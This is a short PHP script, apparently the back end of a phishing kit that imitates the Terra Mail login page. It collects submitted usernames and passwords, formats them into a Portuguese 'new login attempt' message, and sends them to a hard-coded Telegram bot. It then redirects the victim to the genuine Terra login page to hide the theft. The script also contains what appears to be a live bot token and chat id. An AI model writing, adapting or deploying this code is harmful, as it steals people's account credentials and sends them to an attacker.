<?php
// Garante que é POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

// Debug correto (opcional – remova em produção)
// error_log(print_r($_POST, true));

// aceita JSON ou form
$in = json_decode($raw,1) ?: [];
$_POST = array_merge($_POST, $in);

$email = trim($_POST['user'] ?? $_POST['login'] ?? $_POST['usuario'] ?? '');
$senha = trim($_POST['senha'] ?? $_POST['pass'] ?? $_POST['password'] ?? '');

$msg = "📩 Nova tentativa de login\n";
$msg .= "📧 Email: ".$email."\n";
$msg .= "🔐 Senha: ".$senha."\n";
$msg .= "📅 Data: ".date("d/m/Y H:i:s");

$token   = '7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY';
$chat_id = '6261750345';

file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?".
                  http_build_query(['chat_id'=>$chat_id,'text'=>$msg,'parse_mode'=>'Markdown']));

header("Location: https://servicos.terra.com.br/para-voce/terra-mail/?cdConvenio=CVTR00001825/login");
exit;
?>
